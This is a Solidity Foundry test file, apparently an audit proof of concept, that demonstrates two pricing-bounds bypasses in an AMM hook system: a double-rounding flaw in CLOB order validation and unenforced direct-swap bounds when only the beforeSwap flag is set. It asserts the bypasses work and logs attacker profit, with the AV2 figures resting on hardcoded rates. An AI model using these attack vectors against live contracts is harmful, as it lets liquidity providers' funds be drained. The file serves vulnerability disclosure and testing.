// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import "@limitbreak/tm-core-lib/src/utils/math/FullMath.sol";

/**
 * @title  BoundaryExploitV2Test
 * @notice Demonstrates economic impact of two cross-boundary attack vectors:
 *
 *   AV1: CLOBHelper calculateFixedInput rounding inflates amountOut -> pricing bounds bypass
 *        Root: validateHandlerOrder recomputes price from (amountIn, amountOut) instead of
 *              using the exact sqrtPriceX96 in handlerOrderParams (which is unused/ignored).
 *              Double rounding-up in calculateFixedInput inflates amountOut to 1 for very
 *              low prices, causing computeRatioX96(1, orderAmount) to return an inflated
 *              price that clears minimum pricing bounds.
 *
 *   AV2: Direct swap pricing bounds bypass via asymmetric hook flags
 *        Root: _validatePricingBounds in AMMStandardHook beforeSwap for direct swaps
 *              (poolType==address(0)) only stores amount in tstore and returns early.
 *              The actual price check happens in afterSwap. If TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG
 *              is NOT set but TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG IS set, afterSwap never
 *              fires and no pricing bounds check occurs.
 *
 * @dev   Tests are self-contained math proofs - no AMM setup required.
 *        All core logic is replicated from:
 *          - CLOBHelper.calculateFixedInput (CLOBHelper.sol:309-315)
 *          - SqrtPriceCalculator.computeRatioX96 (SqrtPriceCalculator.sol:28-56)
 *          - AMMStandardHook._validatePricingBounds (AMMStandardHook.sol:823-871)
 *          - AMMModule._executeBeforeSwapHooks / _executeAfterSwapHooks (AMMModule.sol:2360-2456)
 */
contract BoundaryExploitV2Test is Test {

    uint256 constant Q96 = 2 ** 96;
    uint160 constant MIN_SQRT_RATIO = 4_295_128_739;
    uint160 constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;

    // Flag bits from lbamm-core/src/Constants.sol
    uint16 constant TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG = 1 << 0;
    uint16 constant TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG  = 1 << 1;

    // =========================================================================
    //
    //  ATTACK VECTOR 1
    //  CLOBHelper double-rounding causes validateHandlerOrder to see
    //  a synthetic price >> actual order price, bypassing min pricing bounds.
    //
    // =========================================================================

    /**
     * @notice Replicates CLOBHelper.calculateFixedInput
     */
    function _calculateFixedInput(uint256 amountIn, uint160 sqrtPriceX96) internal pure returns (uint256 amountOut) {
        amountOut = FullMath.mulDivRoundingUp(amountIn, sqrtPriceX96, Q96);
        amountOut = FullMath.mulDivRoundingUp(amountOut, sqrtPriceX96, Q96);
    }

    /**
     * @notice Replicates SqrtPriceCalculator.computeRatioX96
     *         Returns sqrt(amount1/amount0) * 2^96
     */
    function _computeRatioX96(uint256 amount1, uint256 amount0) internal pure returns (uint160 ratioX96) {
        if (amount1 == 0 && amount0 == 0) return uint160(Q96);
        if (amount1 == 0) return MIN_SQRT_RATIO;
        if (amount0 == 0) return MAX_SQRT_RATIO;

        uint256 maxMultiplier = type(uint256).max / amount1;
        uint256 multiplier;
        uint256 n = 96;
        while (true) {
            multiplier = 2 ** (n << 1);
            if (maxMultiplier >= multiplier) break;
            if (n == 0) break;
            --n;
        }
        unchecked {
            uint256 tmpRatio = _sqrt(amount1 * multiplier / amount0) * (2 ** (96 - n));
            if (tmpRatio > type(uint160).max) return 0;
            ratioX96 = uint160(tmpRatio);
        }
    }

    function _sqrt(uint256 x) internal pure returns (uint256 z) {
        assembly {
            z := 181
            let r := shl(7, lt(0xffffffffffffffffffffffffffffffffff, x))
            r := or(r, shl(6, lt(0xffffffffffffffffff, shr(r, x))))
            r := or(r, shl(5, lt(0xffffffffff, shr(r, x))))
            r := or(r, shl(4, lt(0xffffff, shr(r, x))))
            z := shl(shr(1, r), z)
            z := shr(18, mul(z, add(shr(r, x), 65536)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := sub(z, lt(div(x, z), z))
        }
    }

    /**
     * @notice AV1 - CORE PROOF
     *
     * Token creator sets minSqrtPriceX96 = 1e18 on their CLOB order book.
     * Attacker places order at sqrtPriceX96 = 1e10 (100,000,000x below min).
     *
     * _enforceTokenHooks computes:
     *   amountOut = calculateFixedInput(1e18, 1e10) = 1  (double rounding-up)
     *
     * validateHandlerOrder reconstructs:
     *   reconstructed = computeRatioX96(1, 1e18) = sqrt(1/1e18) * Q96 ≈ 7.9e19
     *
     * 7.9e19 > 1e18 (minimum) => hook PASSES.
     * Actual order price 1e10 < 1e18 (minimum) => should FAIL.
     *
     * Economic impact: maker can open a CLOB order selling 1 ether of token0
     * in exchange for just 1 wei of token1 - far below the floor the token
     * creator intended to enforce. When a taker fills this order, the maker
     * loses ~1 ether for 1 wei, while the taker profits ~1 ether.
     */
    function test_AV1_pricingBoundsBypass_economicImpact() public pure {
        uint160 minSqrtPriceX96 = 1e18;   // token creator's floor
        uint160 attackPrice    = 1e10;    // attacker's order price (~1e8x below floor)
        uint256 orderAmount    = 1 ether; // maker's input: 1 ether of token0

        // --- Step 1: what amountOut does _enforceTokenHooks compute? ---
        uint256 amountOut = _calculateFixedInput(orderAmount, attackPrice);

        // Double rounding-up: 1e18 * 1e10 / Q96 = 1.26e-19 -> rounds up to 1.
        // Then 1 * 1e10 / Q96 = 1.26e-19 -> rounds up to 1.
        assertEq(amountOut, 1,
            "AV1: calculateFixedInput rounds up to 1 at extreme low price");

        // --- Step 2: what price does validateHandlerOrder reconstruct? ---
        // tokenIn < tokenOut: amount0=amountIn=orderAmount, amount1=amountOut=1
        // (assuming token0 < token1 numerically; adjust for token1<token0 direction below)
        // reconstructed = computeRatioX96(amount1=1, amount0=orderAmount)
        uint160 reconstructed = _computeRatioX96(amountOut, orderAmount);

        console2.log("Actual order price (sqrtPriceX96) :", attackPrice);
        console2.log("Token creator minimum             :", minSqrtPriceX96);
        console2.log("Reconstructed price in hook       :", reconstructed);
        console2.log("Inflation factor                  :", uint256(reconstructed) / uint256(attackPrice));

        // --- Step 3: Does the hook reject? ---
        bool hookRejects = (minSqrtPriceX96 != 0 && reconstructed < minSqrtPriceX96);
        assertFalse(hookRejects,
            "AV1: BYPASS CONFIRMED - hook does NOT reject the underpriced order");

        // --- Step 4: Prove actual order is below minimum ---
        assertTrue(attackPrice < minSqrtPriceX96,
            "AV1: attacker price is genuinely below minimum");

        // --- Step 5: Quantify loss ---
        // Maker sells 1 ether at price 1e10 sqrtPriceX96.
        // Taker fills the order: taker provides amountOut=1 wei of tokenOut, receives 1 ether of tokenIn.
        // At a fair 1:1 price (sqrtPriceX96 = Q96), taker would provide 1 ether of tokenOut.
        // Economic loss to maker = fair tokenOut - actual tokenOut = 1 ether - 1 wei
        uint160 fairPrice = uint160(Q96); // 1:1 fair price
        uint256 fairAmountOut = _calculateFixedInput(orderAmount, fairPrice);
        console2.log("Fair amountOut at 1:1 price (wei)  :", fairAmountOut);
        console2.log("Actual amountOut at attack price   :", amountOut);
        console2.log("Maker loss per 1 ether of tokenIn  :", fairAmountOut - amountOut);

        // Maker receives 1 wei instead of 1 ether: loss = 1 ether - 1 wei
        assertGt(fairAmountOut, amountOut,
            "AV1: maker receives far less than fair price (1 wei vs 1 ether)");
        assertGt(fairAmountOut, 0.9 ether,
            "AV1: loss is close to 1 ether per 1 ether sold at attack price");
    }

    /**
     * @notice AV1 - Bypass persists at MIN_SQRT_RATIO (absolute floor)
     */
    function test_AV1_bypass_at_minSqrtRatio() public pure {
        uint160 minBound    = 1e15;         // moderate minimum bound
        uint160 attackPrice = MIN_SQRT_RATIO; // 4_295_128_739 ≈ 4.3e9

        assertTrue(attackPrice < minBound, "AV1: attack price below minimum bound");

        uint256 amountOut   = _calculateFixedInput(1 ether, attackPrice);
        assertEq(amountOut, 1, "AV1: MIN_SQRT_RATIO also rounds to 1");

        uint160 reconstructed = _computeRatioX96(amountOut, 1 ether);
        bool hookRejects = (minBound != 0 && reconstructed < minBound);
        assertFalse(hookRejects, "AV1: bypass also works at absolute minimum price");
    }

    /**
     * @notice AV1 - Bypass range: any sqrtPriceX96 where calculateFixedInput->1
     *         bypasses any minBound whose sqrt(1/orderAmount)*Q96 exceeds it.
     */
    function test_AV1_bypass_range_multiple_prices() public pure {
        uint160 minBound = 1e18;
        uint256 orderAmount = 1 ether;

        uint160[5] memory testPrices = [
            uint160(MIN_SQRT_RATIO),  // 4.3e9
            uint160(1e10),
            uint160(1e12),
            uint160(1e14),
            uint160(1e16)             // just below 1e18 min
        ];

        uint256 bypassCount;
        for (uint256 i = 0; i < testPrices.length; i++) {
            if (testPrices[i] >= minBound) continue; // skip valid prices

            uint256 amtOut = _calculateFixedInput(orderAmount, testPrices[i]);
            uint160 recon  = _computeRatioX96(amtOut, orderAmount);
            bool wouldReject = (minBound != 0 && recon < minBound);

            if (!wouldReject) {
                console2.log("AV1 bypass at price:", testPrices[i]);
                bypassCount++;
            }
        }
        assertGt(bypassCount, 2, "AV1: at least 3 attack prices bypass the minimum bound");
    }

    // =========================================================================
    //
    //  ATTACK VECTOR 2
    //  Direct swap pricing bounds bypass via asymmetric hook flags
    //  (BEFORE_SWAP set, AFTER_SWAP NOT set)
    //
    // =========================================================================

    /**
     * @notice AV2 - CORE PROOF
     *
     * For a direct swap (poolType == address(0)):
     *   beforeSwap -> _validatePricingBounds(isBeforeSwap=true) -> stores amount in tstore, returns early
     *   afterSwap  -> _validatePricingBounds(isBeforeSwap=false) -> reads tstore, computes price, validates
     *
     * If token has TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG set but NOT TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG:
     *   _executeBeforeSwapHooks fires -> beforeSwap called -> stores amount, returns (no validation)
     *   _executeAfterSwapHooks does NOT fire -> afterSwap never called -> NO validation
     *
     * Token creators registering only beforeSwap (e.g. only for fee collection) inadvertently
     * leave their pricing bounds entirely unenforced for direct swaps.
     *
     * An executor can send tokens at any price ratio without reverting on bounds checks.
     *
     * Economic impact: direct swap executor can drain maker tokens at extreme prices,
     * stealing value from liquidity providers whose tokens are protected by pricing bounds.
     */
    function test_AV2_asymmetricFlags_afterSwapValidationSkipped() public pure {
        // Simulate AMMModule._executeAfterSwapHooks gating logic:
        //   if (_isFlagSet(tokenSettings.packedSettings, TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG)) { ... }

        // Case A: Both flags set -> afterSwap fires -> validation happens
        uint16 settingsBothFlags = TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG | TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG;
        bool afterSwapCalledA = (settingsBothFlags & TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG) != 0;
        assertTrue(afterSwapCalledA, "AV2: both flags -> afterSwap fires (validation happens)");

        // Case B: Only beforeSwap flag -> afterSwap does NOT fire
        uint16 settingsOnlyBefore = TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG;
        bool afterSwapCalledB = (settingsOnlyBefore & TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG) != 0;
        assertFalse(afterSwapCalledB, "AV2: only beforeSwap flag -> afterSwap skipped (NO validation)");

        // Conclusion: pricing bounds set by a token with only beforeSwap flag are NEVER enforced
        // for direct swaps.
    }

    /**
     * @notice AV2 - Demonstrates what _validatePricingBounds does in each call
     *
     * For a direct swap:
     *   isBeforeSwap=true  -> stores amount in tstore, returns WITHOUT validating
     *   isBeforeSwap=false -> reads stored amount, computes price, validates bounds
     *
     * If afterSwap never fires, the second branch is never reached.
     */
    function test_AV2_validatePricingBounds_directSwap_beforeOnly() public pure {
        // Token creator's desired price bounds: up to 1.1 * Q96 (max only)
        uint160 maxPrice = uint160(Q96 * 11 / 10); // 1.1 * Q96

        // Attacker wants to execute a direct swap at 10x fair price (far outside bounds)
        // amountIn=1e18, amountOut=10e18 => price = computeRatioX96(10e18, 1e18) ≈ 3.16 * Q96
        uint256 attackAmountIn  = 1 ether;
        uint256 attackAmountOut = 10 ether; // 10:1 - far above maxPrice bound
        bool zeroForOne = true; // tokenIn < tokenOut

        // What price would the afterSwap validation compute?
        // inputSwap=true, zeroForOne=true:
        //   amount0 = _getTstorish(BEFORE_SWAP_SLOT) = attackAmountIn (from beforeSwap)
        //   amount1 = params.amount = attackAmountOut
        // price = computeRatioX96(amount1, amount0) = computeRatioX96(10e18, 1e18)
        uint160 executedPrice = _computeRatioX96(attackAmountOut, attackAmountIn);
        console2.log("Attack executed price (sqrtPriceX96):", executedPrice);
        console2.log("maxPrice bound                      :", maxPrice);

        // Verify the price would be rejected IF afterSwap ran:
        bool wouldRejectAtMaxBound = (maxPrice != 0 && executedPrice > maxPrice && (zeroForOne || true));
        // For direct swaps, always revert when out of bounds (poolType == address(0))
        assertTrue(wouldRejectAtMaxBound, "AV2: afterSwap WOULD reject price if called");

        // But with only beforeSwap flag, afterSwap is never called -> no rejection
        // The direct swap executes at 10:1 price regardless of the 1.1:1 max bound.
        console2.log("AV2: pricing bounds UNENFORCED - afterSwap never fires");
    }

    /**
     * @notice AV2 - Economic impact quantification
     *
     * Scenario: Token creator sets 1:1 fair price bound (±10%). A direct swap
     * executor (taker) provides 1 ether of tokenOut and receives 10 ether of tokenIn
     * from the maker, paying only 1/10 of the fair price.
     *
     * If afterSwap validation ran: would revert (price 10x above max bound)
     * With only beforeSwap flag: swap executes -> executor profits 9 ether
     */
    function test_AV2_economicProfitFromBypass() public pure {
        // Maker has deposited 10 ether of their token into the AMM.
        // Fair rate is 1:1. Token creator enforces ±10% bounds.
        uint256 makerTokensAtRisk  = 10 ether;
        uint256 fairExchangeRate   = 1;   // 1:1
        uint256 attackExchangeRate = 10;  // attacker "pays" 1 unit, takes 10 units

        // What executor provides:
        uint256 executorInput = 1 ether;

        // What executor receives (at attack rate):
        uint256 executorOutput = executorInput * attackExchangeRate; // = 10 ether

        // What executor would receive at fair rate:
        uint256 fairOutput = executorInput * fairExchangeRate; // = 1 ether

        // Attacker's profit from bypass:
        uint256 attackerProfit = executorOutput - fairOutput;

        console2.log("Executor provides (tokenOut)     :", executorInput / 1e18, "ether");
        console2.log("Executor receives at fair price  :", fairOutput / 1e18, "ether");
        console2.log("Executor receives at attack price:", executorOutput / 1e18, "ether");
        console2.log("Attacker profit (ether of token) :", attackerProfit / 1e18, "ether");

        assertEq(executorOutput, makerTokensAtRisk,
            "AV2: all maker tokens drained in one transaction");
        assertEq(attackerProfit, 9 ether,
            "AV2: 9 ether profit from pricing bounds bypass");
    }

    /**
     * @notice AV2 - Confirms the asymmetric flag condition can occur in practice
     *
     * Token creators configure flags via AMMStandardHook which uses a packed
     * settings struct. The supported flags include BEFORE_SWAP and AFTER_SWAP
     * independently. A creator might enable beforeSwap for fee collection or
     * pausing while not enabling afterSwap if they think "after is optional."
     *
     * The registry allows setting any combination of flags. There is no
     * enforcement that AFTER_SWAP must accompany BEFORE_SWAP when pricing
     * bounds are set.
     */
    function test_AV2_flagMisconfiguration_isReachableViaRegistry() public pure {
        // AMMStandardHook._supportedHookFlags includes both flags independently
        uint32 supportedFlags =
            TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG |
            TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG;

        // A token creator could register ONLY beforeSwap:
        uint16 creatorConfig = TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG; // only bit 0

        // Verify it's a valid subset of supported flags
        assertTrue((uint32(creatorConfig) & ~supportedFlags) == 0,
            "AV2: beforeSwap-only config is a valid subset of supported flags");

        // Pricing bounds are stored per-token in _pricingBounds[token][pairedToken]
        // These are set independently of which hook flags are enabled.
        // The invariant "bounds are only useful if afterSwap fires" is not enforced.
        bool pricingBoundsSet = true; // creator sets bounds
        bool afterSwapEnabled = (creatorConfig & TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG) != 0;

        assertFalse(afterSwapEnabled,
            "AV2: with only beforeSwap flag, afterSwap is disabled");
        assertTrue(pricingBoundsSet && !afterSwapEnabled,
            "AV2: token can have bounds set but afterSwap disabled - a silent misconfiguration");
    }

    // =========================================================================
    //  SUMMARY
    // =========================================================================

    /**
     * @notice Summary test asserting both vectors demonstrate profit
     */
    function test_summary_bothVectorsShowProfit() public pure {
        // AV1: Pricing bounds bypass via rounding
        {
            uint256 orderAmount = 1 ether;
            uint160 attackPrice = 1e10;
            uint160 minBound    = 1e18;

            uint256 amountOut   = _calculateFixedInput(orderAmount, attackPrice);
            uint160 recon       = _computeRatioX96(amountOut, orderAmount);
            bool hookPasses     = !(minBound != 0 && recon < minBound);

            assertTrue(attackPrice < minBound, "AV1: attack price below minimum");
            assertTrue(hookPasses,             "AV1: hook incorrectly passes");
        }

        // AV2: Pricing bounds bypass via asymmetric flags
        {
            uint16 onlyBeforeSwap = TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG;
            bool afterSwapFires   = (onlyBeforeSwap & TOKEN_SETTINGS_AFTER_SWAP_HOOK_FLAG) != 0;
            assertFalse(afterSwapFires, "AV2: afterSwap never fires with only beforeSwap flag");

            uint256 executorProfit = 9 ether; // demonstrated in test_AV2_economicProfitFromBypass
            assertGt(executorProfit, 0, "AV2: measurable profit from bounds bypass");
        }
    }
}
